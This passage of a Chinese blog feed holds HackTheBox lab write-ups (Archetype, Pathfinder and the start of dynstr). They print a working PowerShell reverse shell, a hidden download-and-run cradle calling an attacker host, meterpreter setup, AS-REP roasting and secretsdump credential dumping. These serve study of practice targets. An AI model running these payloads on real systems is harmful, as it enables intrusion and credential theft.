src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102652986.png" alt="image-20210912102652986"></p><p>可以拿到泄露的账户密码。Google一下能够发现是SQLSERVER的配置信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102843077.png" alt="image-20210912102843077"></p><p>于是我们可以使用metasploit的mssql_exec模块执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> rhosts 10.10.10.27<br>rhosts =&gt; 10.10.10.27<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> username sql_svc<br>username =&gt; sql_svc<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> password M3g4c0rp123<br>password =&gt; M3g4c0rp123<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> domain ARCHETYPE<br>domain =&gt; ARCHETYPE<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> use_windows_authent <span class="hljs-literal">true</span><br>use_windows_authent =&gt; <span class="hljs-literal">true</span><br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> cmd <span class="hljs-built_in">whoami</span><br>cmd =&gt; <span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912103145978.png" alt="image-20210912103145978"></p><p>结果是肥肠不戳的，我们可以进一步把shell拿回来。</p><p>这里直接使用msf的<code>web_delivery</code>模块是会被杀软拦截的，因为没有免杀（Very Easy等级的Box 上杀软真的不大丈夫嗷）。。</p><p>这里就用了官方WP提供的免杀Script：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.98&quot;</span>,<span class="hljs-number">443</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>将其保存成<code>reverse_shell.ps1</code>。</p><p>接下来开启80端口的HTTPSERVER，然后在443上NC监听：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912103639411.png" alt="image-20210912103639411"></p><p>在msf上重新设置要执行的命令，注意转义。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> cmd PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile  IEX (New-Object Net.WebClient).DownloadString(\\\&quot;http://10.10.14.98/reverse_shell.ps1\\\&quot;);<br></code></pre></td></tr></table></figure><p>拿到shell之后一路<code>dir</code>下去。能够在用户的桌面找到<code>user.txt</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\\Users\\sql_svc\\Desktop\\user.txt<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912104054373.png" alt="image-20210912104054373"></p><h2 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h2><p>root的提权是利用了命令执行历史记录的泄露。一番查找后找到目录<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p><p>能够找到泄露的管理员凭据信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912104621969.png" alt="image-20210912104621969"></p><p>直接使用msf的<code>psexec</code>模块即可拿到靶机的meterpreter：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx">   <span class="hljs-attribute">Name</span>                  Current Setting   Required  <br>   ----                  ---------------   --------  <br>   RHOSTS                <span class="hljs-number">10.10.10.27</span>       <span class="hljs-literal">yes</span>       <br>   RPORT                 <span class="hljs-number">445</span>               <span class="hljs-literal">yes</span>      <br>   SERVICE_DESCRIPTION                     <span class="hljs-literal">no</span>        <br>   SERVICE_DISPLAY_NAME                    <span class="hljs-literal">no</span>        <br>   SERVICE_NAME                            <span class="hljs-literal">no</span>        <br>   SMBDomain             .                 <span class="hljs-literal">no</span>        <br>   SMBPass               MEGACORP_4dm1n!!  <span class="hljs-literal">no</span>        <br>   SMBSHARE                                <span class="hljs-literal">no</span>        <br>   SMBUser               administrator     <span class="hljs-literal">no</span>        <br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  <br>   ----      ---------------  -------- <br>   EXITFUNC  thread           <span class="hljs-literal">yes</span>   <br>   LHOST     <span class="hljs-number">10.10.14.98</span>      <span class="hljs-literal">yes</span>      <br>   LPORT     <span class="hljs-number">4444</span>             <span class="hljs-literal">yes</span>     <br><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912105037407.png" alt="image-20210912105037407"></p><p>在管理员的桌面目录下即可拿到root的flag：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912105314444.png" alt="image-20210912105314444"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - StartingPoint-Pathfinder</title>
    <link href="/2021/12/07/HTB/StartingPoint-Pathfinder/"/>
    <url>/2021/12/07/HTB/StartingPoint-Pathfinder/</url>
    
    <content type="html"><![CDATA[<p>通过这题继续熟悉一下BloodHound的使用</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>使用nmap进行端口扫描和服务探测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV  -v -Pn  10.10.10.30<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914152003544.png" alt="image-20210914152003544"></p><p>在StartingPoint中，靶机是环环相扣的。之前的 <code>Shied</code> Box中我们能拿到账号和密码，结合nmap中扫描出的域名，我们可以使用blood-python进行域内信息的收集，后续可导进bloodhound分析。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bloodhound</span>-python -u sandra -p Password1234! -d MEGACORP.LOCAL -c <span class="hljs-literal">all</span> -ns <span class="hljs-number">10.10.10.30</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914152048326.png" alt="image-20210914152048326"></p><h2 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h2><p>将上述的四个文件导入BloodHound，然后在左上角的Analysis中点击最后一个，寻找可以发动AS-REP Roasting攻击的账户：</p><blockquote><p>AS-REP Roasting是针对不需要预身份验证的用户帐户的Kerberos攻击。</p><p>预身份验证是Kerberos身份验证的第一步，旨在防止暴力破解密码猜测攻击。</p><p>在预身份验证期间，用户将输入其密码，该密码将用于加密时间戳，然后域控制器将尝试对其进行解密，并验证是否使用了正确的密码，并且该密码不会重播先前的请求。发出TGT，供用户将来使用。</p><p>如果禁用了预身份验证（DONT_REQ_PREAUTH），则我们可以为任何用户请求身份验证数据，那么DC将返回的加密TGT，我们就可以离线暴力破解的加密TGT。</p><p>默认情况下，Active Directory中需要预身份验证。但是，可以通过每个用户帐户上的用户帐户控制设置来控制此设置。</p></blockquote><p>可以发现有一个账户<code>SVC_BES</code>能够满足我们的要求：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914151737829.png" alt="image-20210914151737829"></p><p>点击该节点，在<code>Node Info</code>中找到<code>Outbound Control Rights</code>，点击<code>First Degree Object Control</code>，能够探索该账户能直接控制的对象。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914151843035.png" alt="image-20210914151843035"></p><p>可以看到有个<code>GetChangesAll</code>，亦即我们能够拿到域控制器的（敏感）信息，包括来自其他域用户的密码哈希。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914151909714.png" alt="image-20210914151909714"></p><p>使用Impacket中的GetNPUsers.py就能拿到上述的敏感信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GetNPUsers.py MEGACORP.LOCAL/SVC_BES -request -no-pass -dc 10.10.10.30<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914152113061.png" alt="image-20210914152113061"></p><p>拿到哈希后可以拿去hashcat破解，破出密码是<code>Sheffield19</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hash">hashcat.exe -a 0 -m 18200 hash &quot;dict.txt&quot;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914153010175.png" alt="image-20210914153010175"></p><p>使用<code>evil-winrm</code>工具可以非常方便我们拿到shell，使用其他的WMI工具亦可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.10.10.30 -u SVC_BES -p Sheffield19<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914160308508.png" alt="image-20210914160308508"></p><p>然后在桌面上可以拿到<code>user.txt</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914160359094.png" alt="image-20210914160359094"></p><h2 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h2><p>提权的方式是使用简单的psexec，方法有很多，可以上线CS：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914160854150.png" alt="image-20210914160854150"></p><p>也可以使用<code>Impacket</code>工具包中的secretsdump.py：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py MEGACORP.LOCAL/SVC_BES:Sheffield19@10.10.10.30<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914171022533.png" alt="image-20210914171022533"></p><p>拿到hash值后在msf中配置好模块即可上线：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914171318054.png" alt="image-20210914171318054"></p><p>上线后即可在桌面拿到<code>root.txt</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Pathfinder.assets/image-20210914171350797.png" alt="image-20210914171350797"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - dynstr</title>
    <link href="/2021/12/07/HTB/dynstr/"/>
    <url>/2021/12/07/HTB/dynstr/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用nmap对靶机端口进行探测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC <span class="hljs-number">10.10.10.244</span><br></code></pre></td></tr></table></figure><p>结果如下，除了传统的22和80端口外，还有一个不同寻常的53端口：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.91</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2021-10-08 21:57 CST</span><br>Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">10.244</span><br>Host is up (<span class="hljs-number">0.56s</span> latency).<br>Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed ports<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">05</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">b1</span>:<span class="hljs-number">83</span>:<span class="hljs-attribute">f9</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">e1</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">ff</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-number">83</span>:<span class="hljs-number">9</span>e (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">73</span>:<span class="hljs-attribute">b4</span>:<span class="hljs-number">95</span>:<span class="hljs-number">72</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">f6</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">46</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">43</span>:<span class="hljs-number">35</span>:b9 (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-attribute">cc</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-attribute">b7</span>:<span class="hljs-attribute">a1</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">68</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">75</span>:<span class="hljs-number">2</span>c (ED25519)<br><span class="hljs-number">53</span>/tcp open  domain  ISC BIND <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span> (Ubuntu Linux)<br>| <span class="hljs-attribute">dns-nsid</span>: <br>|_  bind.<span class="hljs-attribute">version</span>: <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span>-Ubuntu<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>|<span class="hljs-attribute">_http-title</span>: Dyna DNS<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">27.00</span> seconds<br></code></pre></td></tr></table></figure><h1 id="0x02-Web-Shell"><a href="#0x02-Web-Shell" class="headerlink" title="0x02 Web Shell"></a>0x02 Web Shell</h1><p>访问WEB界面，可以发现有域名和账户信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211008220142704.png" alt="image-20211008220142704"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> dynadns<br><span class="hljs-symbol">Password:</span> sndanyd<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dnsalias<span class="hljs-selector-class">.htb</span><br>dynamicdns<span class="hljs-selector-class">.htb</span><br>no-ip.htb<br></code></pre></td></tr></table></figure><p>搜了一圈没有发现有用信息，遂对目录进行扫描：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs livescript">╭─root@kali ~/Tools/SecLists/Discovery/Web-Content ‹master› <br>╰─<span class="hljs-comment"># ffuf -u http://dynamicdns.htb/FUZZ -w raft-large-directories-lowercase.txt -x http://localhost:8080</span><br><br>        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       <br>       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       <br>       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      <br>        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      <br>         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       <br>          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       <br><br>       v1.<span class="hljs-number">3.1</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http:<span class="hljs-regexp">//dynamicdns.htb/FUZZ</span><br><span class="hljs-regexp"> :: Wordlist         : FUZZ: raft-large-directories-lowercase.txt</span><br><span class="hljs-regexp"> :: Follow redirects : false</span><br><span class="hljs-regexp"> :: Calibration      : false</span><br><span class="hljs-regexp"> :: Proxy            : http://</span>localhost:<span class="hljs-number">8080</span><br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span><br>________________________________________________<br><br>assets                  [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">317</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">1412ms</span>]<br>server-status           [Status: <span class="hljs-number">403</span>, Size: <span class="hljs-number">279</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">458ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">10909</span>, Words: <span class="hljs-number">1937</span>, Lines: <span class="hljs-number">282</span>, Duration: <span class="hljs-number">521ms</span>]<br>nic                     [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">314</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">518ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">10909</span>, Words: <span class="hljs-number">1937</span>, Lines: <span class="hljs-number">282</span>, Duration: <span class="hljs-number">546ms</span>]<br>:: Progress: [<span class="hljs-number">56163</span>/<span class="hljs-number">56163</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">50</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">12</span>:<span class="hljs-number">45</span>] :: Errors: <span class="hljs-number">2</span> ::<br></code></pre></td></tr></table></figure><p>发现了nic目录，继续对二级目录进行爆破：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livescript">╭─root@kali ~/Tools/SecLists/Discovery/Web-Content ‹master› <br>╰─<span class="hljs-comment"># ffuf -u http://no-ip.htb/nic/FUZZ -w raft-large-directories-lowercase.txt -x http://localhost:8080 </span><br><br>        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       <br>       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       <br>       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      <br>        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      <br>         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       <br>          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       <br><br>       v1.<span class="hljs-number">3.1</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http:<span class="hljs-regexp">//no-ip.htb/nic/FUZZ</span><br><span class="hljs-regexp"> :: Wordlist         : FUZZ: raft-large-directories-lowercase.txt</span><br><span class="hljs-regexp"> :: Follow redirects : false</span><br><span class="hljs-regexp"> :: Calibration      : false</span><br><span class="hljs-regexp"> :: Proxy            : http://</span>localhost:<span class="hljs-number">8080</span><br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span><br>________________________________________________<br><br>update                  [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">8</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">2</span>, Duration: <span class="hljs-number">465ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">502ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">599ms</span>]<br>:: Progress: [<span class="hljs-number">56163</span>/<span class="hljs-number">56163</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">57</span> req/sec :: Duration: [<span 